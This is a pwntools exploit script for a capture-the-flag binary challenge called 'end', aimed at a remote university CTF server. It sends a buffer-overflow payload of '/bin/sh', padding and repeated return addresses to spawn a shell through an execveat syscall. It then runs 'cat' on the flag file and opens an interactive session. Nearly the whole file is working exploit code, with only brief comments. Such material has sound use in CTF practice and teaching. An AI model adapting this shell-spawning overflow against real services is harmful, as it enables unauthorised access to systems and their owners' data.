from pwn import *
import time
context.arch = 'amd64'
local = False

if local:
    r = process('./end')
else:
    r = remote('ctf.adl.csie.ncu.edu.tw', 11007)
# ref: http://look3little.blogspot.tw/2017/09/writeup-ais3-binary-exploitation-bonus.html
# rax equals to the length of the string.
# stub_execveat, rax = 322
payload = '/bin/sh\x00' + 'a' * (296 - 8) + flat([0x4000ed])*3 + 'a' * 2

# raw_input('pause')
r.send(payload)
time.sleep(0.1)
r.sendline('cat /home/`whoami`/flag')
r.interactive()
